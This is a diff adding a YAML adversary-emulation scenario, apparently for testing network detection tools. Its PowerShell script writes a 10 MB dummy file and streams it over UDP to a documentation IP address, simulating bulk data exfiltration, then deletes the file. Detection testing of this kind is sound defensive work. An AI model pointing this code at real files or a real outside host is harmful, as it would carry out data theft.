@@ -1,0 +1,70 @@
+---
+- id: scn011-a1-udp-exfiltration
+  name: "SCN-011 | NDR: UDP Data Exfiltration"
+  description: |
+    Simulates data exfiltration by sending a large volume of UDP packets to
+    a suspicious external IP address. Creates a temporary file and transmits
+    it via UDP to simulate bulk data theft over a non-standard channel.
+
+    MITRE ATT&CK: T1048.003 - Exfiltration Over Alternative Protocol: Unencrypted Non-C2
+    NDR Detection: High-volume UDP traffic to unusual external destination
+
+    Target: 203.0.113.100 (RFC 5737 documentation IP — safe, non-routable)
+    Volume: 10 MB of UDP packets (1400-byte packets)
+
+    What to watch for:
+    - NDR alert for data exfiltration or anomalous outbound data volume
+    - Large UDP data transfer to an unusual external IP
+    - Non-standard port usage for bulk data transfer
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: "Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2 Protocol"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== UDP DATA EXFILTRATION SIMULATION (T1048.003) ===";
+          $targetIP = "203.0.113.100";
+          $targetPort = 12345;
+          $dataMB = 10;
+          $packetSize = 1400;
+          $filePath = "C:\Temp\SimulatedUdpExfil.bin";
+          $fileSize = $dataMB * 1MB;
+          Write-Output "[*] Target: ${targetIP}:${targetPort}";
+          Write-Output "[*] Data volume: ${dataMB} MB";
+          Write-Output "[*] Packet size: ${packetSize} bytes";
+          Write-Output "";
+          $dir = Split-Path -Parent $filePath;
+          if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null };
+          Write-Output "[*] Creating ${dataMB}MB dummy file...";
+          $fh = [System.IO.File]::Create($filePath);
+          $fh.SetLength($fileSize); $fh.Close();
+          Write-Output "[+] Dummy file created at $filePath";
+          Write-Output "[*] Sending UDP packets...";
+          $udp = $null; $fs = $null; $sent = 0;
+          $start = Get-Date;
+          try {
+            $udp = New-Object System.Net.Sockets.UdpClient;
+            $udp.Connect($targetIP, $targetPort);
+            $fs = New-Object System.IO.FileStream($filePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read);
+            $buf = New-Object byte[] $packetSize;
+            while (($n = $fs.Read($buf, 0, $buf.Length)) -gt 0) {
+              $udp.Send($buf, $n) | Out-Null; $sent += $n
+            };
+            Write-Output "[+] Sent $([math]::Round($sent/1MB,1)) MB of UDP data"
+          } catch {
+            Write-Output "[-] Error: $($_.Exception.Message)"
+          } finally {
+            if ($fs) { $fs.Close(); $fs.Dispose() };
+            if ($udp) { $udp.Close(); $udp.Dispose() }
+          };
+          $duration = (Get-Date) - $start;
+          Write-Output "[*] Duration: $([math]::Round($duration.TotalSeconds,1)) seconds";
+          Remove-Item $filePath -Force -ErrorAction SilentlyContinue;
+          Write-Output "[*] Cleanup: dummy file removed";
+          Write-Output "";
+          Write-Output "[*] NDR should flag: High-volume UDP exfiltration to suspicious IP";
+          Write-Output "=== END UDP EXFILTRATION ==="
+        cleanup: |
+          Remove-Item "C:\Temp\SimulatedUdpExfil.bin" -Force -ErrorAction SilentlyContinue
